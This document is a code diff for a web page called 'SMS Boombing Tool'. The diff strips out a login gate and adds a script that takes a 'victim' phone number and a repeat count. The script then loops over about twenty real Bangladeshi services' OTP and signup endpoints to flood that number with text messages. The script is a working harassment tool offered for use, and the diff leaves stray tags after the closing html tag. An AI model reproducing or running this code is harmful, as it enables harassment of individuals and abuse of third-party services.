@@ -4,7 +4,62 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>SMS Boombing Tool</title>
-    <link rel="stylesheet" href="style.css">
+    <style>
+        body {
+            background-color: #1a1a1a;
+            font-family: monospace;
+            color: #33ff33;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .container {
+            text-align: center;
+        }
+
+        #logo {
+            font-size: 14px;
+            white-space: pre;
+        }
+
+        .welcome {
+            color: #ff3333;
+            font-weight: bold;
+        }
+
+        input {
+            display: block;
+            margin: 10px auto;
+            padding: 10px;
+            width: 200px;
+            background: #333;
+            border: 1px solid #33ff33;
+            color: #fff;
+        }
+
+        button {
+            padding: 10px 20px;
+            background: #33ff33;
+            color: #000;
+            border: none;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background: #ff3333;
+            color: #fff;
+        }
+
+        #output {
+            margin-top: 20px;
+            color: #33ff33;
+            max-height: 300px;
+            overflow-y: auto;
+        }
+    </style>
 </head>
 <body>
     <div class="container">
@@ -23,18 +78,70 @@
             [-] FACEBOOK  : ABU RAIHAN
         </pre>
 
-        <div class="login">
-            <input type="text" id="username" placeholder="USERNAME (INBOX ME)">
-            <input type="password" id="password" placeholder="PASSWORD (INBOX ME)">
-            <button onclick="checkLogin()">Login</button>
-        </div>
-
-        <div class="bombing" style="display: none;">
+        <div class="bombing">
             <input type="text" id="number" placeholder="Victim Number (+880)">
             <input type="number" id="amount" placeholder="Amount">
             <button onclick="startBombing()">Start Bombing</button>
             <div id="output"></div>
         </div>
+    </div>
+
+    <script>
+        async function startBombing() {
+            const number = document.getElementById("number").value;
+            const amount = parseInt(document.getElementById("amount").value);
+            const output = document.getElementById("output");
+            output.innerHTML = "";
+
+            const urls = [
+                `https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=0${number}`,
+                `https://www.bioscopelive.com/en/login/send-otp?phone=880${number}&operator=bd-otp`,
+                `https://fundesh.com.bd/api/auth/generateOTP?service_key=&msisdn=${number}`,
+                `https://fundesh.com.bd/api/auth/resendOTP?msisdn=${number}`,
+                `https://api.redx.com.bd/v1/user/signup`,
+                `https://api.bongo-solutions.com/auth/api/login/send-otp`,
+                `https://www.rokomari.com/resend-verification-code?email_phone=880${number}`,
+                `https://www.pizzahutbd.com/customer/sign-in/mobile`,
+                `https://admission.ndub.edu.bd/api/users/register-step-1/`,
+                `https://developer.quizgiri.xyz/api/v2.0/send-otp`,
+                `https://api.shikho.com/auth/v2/send/sms`,
+                `https://prod-api.viewlift.com/identity/signup?site=hoichoitv&phoneNumber=+880${number}&requestType=send&emailConsent=true&whatsappConsent=true`,
+                `https://ezybank.dhakabank.com.bd/VerifIDExt2/api/CustOnBoarding/VerifyMobileNumber`,
+                `https://www.walcart.com/easylogin/account/mobilecheck/?mobile=0${number}&is_login=true&forgetpass=false`,
+                `https://themallbd.com/api/auth/otp_login`,
+                `https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web`,
+                `https://api.wholesalecart.com/v2/user/login-register`,
+                `https://moveon.com.bd/api/v1/customer/auth/phone/request-otp`,
+                `https://app.ipay.com.bd/api/v1/signup/v2`,
+                `https://admission.ndub.edu.bd/api/users/reset/`
+            ];
+
+            for (let i = 0; i < amount; i++) {
+                for (let url of urls) {
+                    try {
+                        let options = { method: "GET" };
+                        if (url.includes("fundesh") || url.includes("redx") || url.includes("bongo") || url.includes("quizgiri") || url.includes("shikho") || url.includes("viewlift") || url.includes("dhakabank") || url.includes("themallbd") || url.includes("ghoorilearning") || url.includes("wholesalecart") || url.includes("moveon") || url.includes("ipay") || url.includes("ndub")) {
+                            options = {
+                                method: "POST",
+                                headers: { "Content-Type": "application/json" },
+                                body: JSON.stringify({ phone: `0${number}`, msisdn: number, phoneNumber: `+880${number}` })
+                            };
+                        }
+                        const response = await fetch(url, options);
+                        if (response.ok) {
+                            output.innerHTML += `SMS SENT SUCCESSFULLY BY KING-14 - ${new Date().toLocaleTimeString()}<br>`;
+                        } else {
+                            output.innerHTML += `Failed to send SMS - ${new Date().toLocaleTimeString()}<br>`;
+                        }
+                    } catch (error) {
+                        output.innerHTML += `Error: ${error.message} - ${new Date().toLocaleTimeString()}<br>`;
+                    }
+                }
+            }
+        }
+    </script>
+</body>
+</html>        </div>
     </div>
     <script src="script.js"></script>
 </body>
